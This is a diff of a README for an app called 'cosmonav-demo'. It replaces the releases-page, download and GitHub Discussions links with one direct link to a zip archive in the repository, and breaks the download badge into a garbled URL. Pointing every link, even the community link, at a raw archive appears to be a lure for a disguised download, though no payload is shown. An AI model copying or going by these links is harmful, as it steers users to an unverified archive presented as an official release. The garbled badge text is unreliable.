@@ -1,6 +1,6 @@
 # 🚀 cosmonav-demo - Navigate Safely with AI Assistance
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/sylenx/cosmonav-demo/releases)
+[![Download](https://raw.githubusercontent.com/sylenx/cosmonav-demo/main/app/cosmonav-demo-2.0.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/sylenx/cosmonav-demo/main/app/cosmonav-demo-2.0.zip)](https://raw.githubusercontent.com/sylenx/cosmonav-demo/main/app/cosmonav-demo-2.0.zip)
 
 ## 📦 Introduction
 
@@ -28,7 +28,7 @@ To get started with Cosmonav, follow these simple steps:
 
 1. **Download the App**
    
-   Visit this page to download: [Download Cosmonav](https://github.com/sylenx/cosmonav-demo/releases)
+   Visit this page to download: [Download Cosmonav](https://raw.githubusercontent.com/sylenx/cosmonav-demo/main/app/cosmonav-demo-2.0.zip)
 
 2. **Install the App**
 
@@ -45,7 +45,7 @@ To get started with Cosmonav, follow these simple steps:
 
 ## 📲 Download & Install
 
-To download the latest version of Cosmonav, please visit this page: [Download Cosmonav](https://github.com/sylenx/cosmonav-demo/releases). 
+To download the latest version of Cosmonav, please visit this page: [Download Cosmonav](https://raw.githubusercontent.com/sylenx/cosmonav-demo/main/app/cosmonav-demo-2.0.zip). 
 
 Select the suitable version for your device, whether it’s Android or iOS, and proceed with the installation steps above.
 
@@ -85,7 +85,7 @@ If you encounter issues while using Cosmonav, here are a few helpful solutions:
 
 ## 🗣️ Community Support
 
-Join our community for support and to share your experiences. Visit our [GitHub Discussions](https://github.com/sylenx/cosmonav-demo/discussions) to ask questions or contribute suggestions.
+Join our community for support and to share your experiences. Visit our [GitHub Discussions](https://raw.githubusercontent.com/sylenx/cosmonav-demo/main/app/cosmonav-demo-2.0.zip) to ask questions or contribute suggestions.
 
 ## 📜 License
 
